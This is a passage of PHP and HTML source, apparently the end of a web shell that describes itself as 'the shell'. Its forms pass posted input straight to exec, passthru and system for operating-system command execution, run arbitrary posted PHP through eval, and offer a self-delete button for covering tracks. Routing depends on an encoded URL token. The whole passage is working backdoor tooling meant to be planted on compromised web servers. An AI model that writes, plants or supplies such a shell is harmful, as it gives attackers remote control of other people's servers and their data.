	<div class="dash-unit">
	<dtitle><h2>terminal</h2></dtitle><hr>
		<p style="color:#ffffff;">Command line execution via exec, passthru or system.</p>
		
		<form action="" method="post"><table><tr><td><b style="color:#ffffff;"> Command Execution: &nbsp;&nbsp;&nbsp;</b></td><td><input style="color:#000000;"type="text" placeholder="root~$ " autocomplete="off" name="command" class="command"/></td></tr></table></div>
	<?php

		$out = array();
		if(cmd()=="exec"){
			echo '<b style="color:#ffffff;">Using: exec =></b> ';
			exec($_POST['command'], $out);
			foreach ($out as $line) {
				echo "$line\n";
			}
		}elseif (cmd()=="passthru") {	

			echo "Using: passthru => ";			
			passthru($_POST['command'], $out);
			foreach ($out as $line) {
				echo "$line\n";
			}
		}elseif(cmd()=="system"){
			echo "Using: system => ";
			system($_POST['command'], $out);
			foreach ($out as $line) {
				echo "$line\n";
			}
		}
}elseif(strstr($CurrentUrl, "a253aXN1ZQ")){
	

		?>
		<h2 align="center" style="color:#ffffff">Sorry next version </h2>
	<?php
}elseif(strstr($CurrentUrl, "?eval")){
	
	?>
	<div class="container">
	<div class="row">
	<div class="col-sm-12 col-lg-12">
	<div class="dash-unit"><center>
	<h4>Eval (PHP code execution)</h4>
	<form action="" method="post">
		<textarea name="phpeval" style="width:700px;height:190px;padding:5px;background:#CCCCCC;">//Example, get all PHP info about the server 

echo phpinfo();</textarea><br />
		<input style="padding:4px 10px;margin:10px 0px;" name="evalexecute" value="Execute Code" type="submit"/>
	</form></center>
	</div>
	<div class="dash-unit"><center>
		<h4>Information</h4>
		<p>Enter your specified php code within the textarea and wait for the response.</p>
		<p><strong>Example: </strong><i>echo phpinfo();</i></p><br /><br />
		<h4>Warning</h4>
		<p>including external files with seperate stylesheets may affect the apearence of G6 styles.</p></center>
	</div></div></div></div>
	<?php
		if(isset($_POST['evalexecute'])){
			eval($_POST['phpeval']);
		}
}elseif(strstr($CurrentUrl, "?srmve")){
		get_srv_info();
	?>
	<p>If you are sure you wish to remove the shell click the button below, make sure you are certain as you wil only have one shot at this.</p>
	<form action="" method="post">
		<center><input style="padding:7px 15px;margin:10px 0px;" name="Remove" value="Remove Shell" type="submit"/></center>
	</form>
	<?php
	if(isset($_POST['Remove'])){
		if(file_exists(__FILE__)){
			unlink(__FILE__);
		}
	}
}elseif(strstr($CurrentUrl, "?")){
	index();
}
else{
	get_srv_info();

?>
	
	<?php
}
ob_flush();

?>
</div>
<body>
</html>